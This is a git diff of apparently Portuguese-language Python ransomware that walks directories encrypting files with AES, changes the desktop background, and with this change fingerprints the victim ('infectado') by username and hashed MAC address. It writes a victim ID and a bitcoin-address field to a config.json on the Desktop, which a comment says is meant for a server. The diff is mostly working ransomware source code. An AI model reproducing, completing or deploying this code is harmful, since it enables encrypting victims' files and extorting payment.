@@ -16,6 +16,7 @@ from AES import *
 from RSA import *
 from SRSA import *
 
+# classe da vitma que foi infectada
 class infectado():
     def __init__(self):
         self.nome_pc = None
@@ -23,7 +24,7 @@ class infectado():
 
     def get_name(self):
         self.comando = subprocess.Popen('whoami', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        self.nome_pc = self.comando.stdout.read()
+        self.nome_pc = self.comando.stdout.read().replace('\n','')
 
     def get_id(self):
         self.comando = subprocess.Popen('ifconfig -a | grep ether', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -31,13 +32,42 @@ class infectado():
         self.s = self.saida.split()
         self.mac_addr = self.s[1]
         self.id = hashlib.sha256(self.mac_addr).hexdigest()
-    '''
-    a = infectado()
-    a.get_name()
-    print(a.nome_pc)
-    a.get_id ()
-    print(a.id)
-    '''
+
+# função que cadastra o usuario e salva como json para enviar para o servidor.
+def get_usuario():
+    caminho = os.environ['HOME']+'/Desktop/'
+    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
+    if(os.path.isdir(caminho)):
+        caminho_correto = caminho
+    elif(os.path.isdir(caminho2)):
+        caminho_correto = caminho2
+
+    usuario = infectado()
+    usuario.get_name()
+    nome_pc = usuario.nome_pc
+    print(nome_pc)
+    usuario.get_id()
+    id_pc = usuario.id
+    print(id_pc)
+    data = {'id': id_pc, 'nome': nome_pc , 'btc_addr': None}
+    string_data = json.dumps(data)
+    with open(caminho_correto + 'config.json','wb') as f:
+        f.write(string_data.encode())
+
+    # ler campos
+    # open('config.json','rb')
+    # dados = f.read()
+    # obj = json.loads(dados)
+    # print(obj['id'])
+
+
+'''
+NOVAS COISAS :
+ - arquivo na area de trabalho com todos os arquivos criptografados.
+ - json na area de trabalho com o ID, nome,
+
+
+'''
 
 # ponto de partida da criptografia
 def menu(senha_AES):
@@ -54,7 +84,7 @@ def listar_media(senha_AES, tipos_arq):
         listar(senha_AES,caminho,tipos_arq)
 
 
-# função que lista todos os arquivos e criptografa ou descriptografa
+# função que lista todos os arquivos e criptografa
 def listar(chave_AES,diretorio, tipos_arq):
     atual = os.getcwd()
     for caminho, diretorio, arquivo in os.walk(diretorio):
@@ -113,6 +143,7 @@ def crypto_all():
 if __name__ == "__main__":
     crypto_all()
     change_background()
+    get_usuario()
     pass
 
 
